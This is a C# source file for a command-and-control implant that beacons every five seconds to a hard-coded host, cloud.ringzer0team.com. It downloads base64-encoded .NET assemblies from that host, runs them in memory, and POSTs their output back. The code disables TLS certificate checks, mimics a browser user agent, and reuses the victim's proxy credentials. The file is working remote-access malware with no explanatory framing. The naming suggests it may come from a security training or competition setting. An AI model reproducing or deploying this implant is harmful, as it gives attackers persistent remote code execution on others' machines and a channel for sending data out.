#define CodeDebugMode

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace c2
{

#if CodeDebugMode
    class DebugInfo
    {
        public static void Print(string data)
        {
            Console.WriteLine(data);
        }
    }
#endif
    class ExecuteCompiledCSharp
    {
        public static void Execute(string assembly, string c2url, string c2host)
        {
            byte[] bytes = Convert.FromBase64String(assembly);
            Thread t = new Thread(() => InternalExecute(bytes, c2url, c2host));
            t.Start();
        }

        private static void InternalExecute(byte[] assembly, string c2url, string c2host)
        {
            Networking n = new Networking(c2url, c2host);
            StringWriter sw = new StringWriter();
            StringBuilder sb = new StringBuilder();
            try
            {
                Assembly a = Assembly.Load(assembly);
                MethodInfo m = a.EntryPoint;

#if CodeDebugMode
                DebugInfo.Print(String.Format("Data received entry point is: {0}", a.EntryPoint));
#endif
                TextWriter tw = Console.Out;
                Console.SetOut(sw);

                object o = a.CreateInstance(m.Name);
                m.Invoke(null, new object[] { (object[])null });

                sb.Append(sw.ToString());
                sw.Close();

                Console.SetOut(tw);

                n.SendRequest(sb.ToString());

            } catch(Exception e)
            {
                n.SendRequest(e.Message);
            }
        }
    }

    class Networking
    {
        private string url;
        private string host;
        public Networking(string c2url, string c2host)
        {
            url = c2url;
            host = c2host;

            ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(delegate { return true; });
        }

        public string SendRequest(string data)
        {
            string output = "";
            Stream s = null;
            StreamReader sr = null;
            HttpWebRequest hwr = (HttpWebRequest)WebRequest.Create(url);

            hwr.Method = "POST";
            hwr.UserAgent = String.Format("Mozilla/5.0 (Windows NT {0}; Win64; x64; rv:85.0) ringzer0/20100101 Firefox/85.0", Environment.OSVersion.ToString());
            hwr.Timeout = 10000;
            hwr.Host = host;
            hwr.ContentType = "application/json";
            hwr.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            try
            {
                byte[] postData = Encoding.ASCII.GetBytes(data);
                s = hwr.GetRequestStream();
                s.Write(postData, 0, postData.Length);
            } catch(Exception e)
            {
                SendRequest(e.Message);
            } 
            finally
            {
                if(s != null)
                {
                    s.Dispose();
                }
            }

            try
            {
                s = hwr.GetResponse().GetResponseStream();
                sr = new StreamReader(s);
                output = sr.ReadToEnd();
            } catch(Exception e)
            {
                SendRequest(e.Message);
            }
            finally
            {
                if (s != null)
                {
                    s.Dispose();
                }
            }

#if CodeDebugMode
            DebugInfo.Print(String.Format("SendRequest received:\n{0}", output));
#endif

            return output;
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            string output = "";
            int c2delay = 5000;
            string c2url = "http://cloud.ringzer0team.com/c2/" + Guid.NewGuid().ToString();
            string c2host = "cloud.ringzer0team.com";

            Networking n = new Networking(c2url, c2host);


#if CodeDebugMode
            DebugInfo.Print(String.Format("Connecting to {0}", c2url));
#endif
            while(true)
            {
                try
                {
                    output = n.SendRequest(null);
                    if(output.Length > 0)
                    {
                        ExecuteCompiledCSharp.Execute(output, c2url, c2host);
                    }
                } catch(Exception e)
                {
                    n.SendRequest(e.Message);
                }
                Thread.Sleep(c2delay);
            }
        }
    }
}
